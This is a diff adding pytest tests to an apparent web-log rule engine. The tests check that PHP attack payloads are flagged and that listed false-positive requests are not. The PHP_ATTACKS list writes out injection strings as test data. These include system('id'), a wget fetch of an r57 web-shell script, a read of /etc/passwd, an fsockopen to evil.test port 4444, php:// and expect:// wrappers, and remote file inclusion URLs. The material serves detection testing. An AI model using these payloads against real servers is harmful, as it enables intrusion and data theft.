@@ -771,3 +771,122 @@ rules:
     (labelled,) = engine.label_events([request("/honeypot")])
 
     assert labelled.label.rule_id == "house_rule"
+
+
+#: PHP shapes that reach an access log, one per rule in `attack/php.yaml`, with
+#: the evasions the CRS corpus actually uses rather than the ones a rule author
+#: would think of unprompted.
+PHP_ATTACKS: list[str] = [
+    "/p?x=<?php system('id'); ?>",
+    "/p?x=<?= $_GET[0] ?>",
+    "/p?x=<? exec('wget http://r57.biz/r57.txt'); ?>",
+    "/p?x=[php]echo 1[/php]",
+    "/p?x={php}phpinfo(){/php}",
+    "/p?x=[\\php]echo 1[/php]",
+    "/p?x=$_GET[cmd]",
+    "/p?x=$_SERVER[DOCUMENT_ROOT]",
+    "/p?x=${'_VAR'.'IABLE_NAME'}",
+    "/p?x=$ {$a}",
+    "/p?x=$$varvar",
+    # Every separator the corpus puts between a function name and its paren.
+    "/p?x=exec  (blah)",
+    "/p?x=exec\t(blah)",
+    "/p?x=exec/*comment*/()",
+    "/p?x=exec //comment\n (blah)",
+    "/p?x=exec #comment\n (blah)",
+    '/p?x=return"system"(xyz)',
+    "/p?x=@exec('test')",
+    "/p?x=call_user_func('system','id')",
+    "/p?x=array_map('system', $a)",
+    # Empty parens are a call, and the corpus scores them as attacks.
+    "/p?x=pi()",
+    "/p?x=strip_tags()",
+    "/p?x=intval(foo)",
+    "/p?x=checkdate()",
+    # Files, sockets, decoding, environment.
+    "/p?x=file_get_contents('/etc/passwd')",
+    "/p?x=fsockopen('evil.test', 4444)",
+    "/p?x=symlink()",
+    "/p?x=base64_decode('cGhwaW5mbygpOw==')",
+    "/p?x=gzinflate(base64_decode($c))",
+    "/p?x=phpinfo()",
+    "/p?x=php_uname()",
+    "/p?x=getenv()",
+    # Configuration, wrappers, inclusion, serialised objects.
+    "/p?x=allow_url_include",
+    "/p?x=memory_limit = 512M",
+    "/p?x=extension_dir=/path/to/example",
+    "/p?x=php://input",
+    "/p?x=php://filter/convert.base64-encode/resource=index.php",
+    "/p?x=expect://id",
+    "/get/plugins/spamx/BaseAdmin.class.php?_CONF[path]=https://foo.bar",
+    "/t.php?src=http://66.240.183.75/crash.php",
+    '/p?u=O:8:"stdClass":1:{s:3:"cmd";s:2:"id";}',
+]
+
+#: And the other half. Every one of these is a CRS false-positive test: traffic
+#: a user reported one of *its* rules firing on, which it then added a case for.
+#: They are the reason the rules above are shaped the way they are, and they
+#: are far more valuable than the attack list — a miss costs a rule nobody has
+#: written, a false alarm discredits every finding the tool makes.
+PHP_BENIGN: list[str] = [
+    '/get?foo=<?xml version="1.0" encoding="UTF-8"?>',
+    '/api/orders?flux=<?xml version="1.0"?><order><id>12345</id></order>',
+    '/get?data=<?xml-stylesheet type="text/xsl" href="style.xsl"?>',
+    # PHP names functions after ordinary words, and the words come first.
+    "/get?foo=executor()",
+    "/get?foo=ecosystem()",
+    "/get?foo=systems()",
+    "/get?foo=system something()",
+    "/get?foo=the system is down()",
+    "/get?foo=cheval($foo)",
+    "/get?foo=audiofile($foo)",
+    "/get?foo=the files (yep)",
+    "/get?foo=filemtime($foo)",
+    # An open paren that never closes is a truncated string, not a call.
+    "/get?foo=exec (",
+    # A function named rather than called.
+    "/get?foo=eval",
+    "/post/?test=Moreover, phpinfo can leak sensitive configuration details.",
+    "/is_int?a=1",
+    # Letters that happen to spell a function name inside a longer word.
+    "/post/?test=PaintValdosta",
+    "/post/?test=SprintForTheCause",
+    "/get?foo=RootAndLeafOpenCamera.jpg",
+    "/post/?test=A loaded ghost gun (unserialized) was recovered in the car.",
+    "/get?foo=autodescription-site-settings[title_strip_tags]",
+    # Brackets and parens in prose, which the `[php]` tag rule must not claim.
+    "/get?x=[ACME]: this is, (another) test (foo)bar or foo(bar).",
+    "/get?x=(foo)bar or foo(bar) or [foo]bar or foo[bar]",
+    '/get?search=this is a "dog" (not a cat)',
+    # A URL in a parameter is a redirect, an OAuth callback or a share link far
+    # more often than it is remote file inclusion, and one log line cannot tell
+    # them apart. Claiming otherwise fires constantly on ordinary traffic.
+    "/page?url=https://example.com",
+    "/www/delivery/lg.php?bannerid=18&zoneid=4&loc=https%3A%2F%2Fwww.example.com%2Ff",
+    # An ERB tag that prints one value is what an output tag is for.
+    "/get?x=<%=title%>",
+]
+
+
+@pytest.mark.parametrize("target", PHP_ATTACKS)
+def test_php_payloads_are_caught(engine: RuleEngine, target: str) -> None:
+    (labelled,) = engine.label_events([request(target)])
+
+    assert labelled.all_labels, f"nothing matched {target!r}"
+    assert any(label.category.is_hostile for label in labelled.all_labels)
+
+
+@pytest.mark.parametrize("target", PHP_BENIGN)
+def test_traffic_certified_harmless_stays_quiet(engine: RuleEngine, target: str) -> None:
+    """The half of the corpus that is easy to forget, and expensive to fail.
+
+    A rule pack reaches any recall it likes by matching everything. What stops
+    that being a good score is being counted when it fires on traffic somebody
+    else has already certified as harmless — so these are pinned individually,
+    and a regression names the exact request rather than moving a percentage.
+    """
+    (labelled,) = engine.label_events([request(target)])
+
+    fired = [label.rule_id for label in labelled.all_labels if label.category.is_hostile]
+    assert not fired, f"{target!r} was claimed by {fired}"
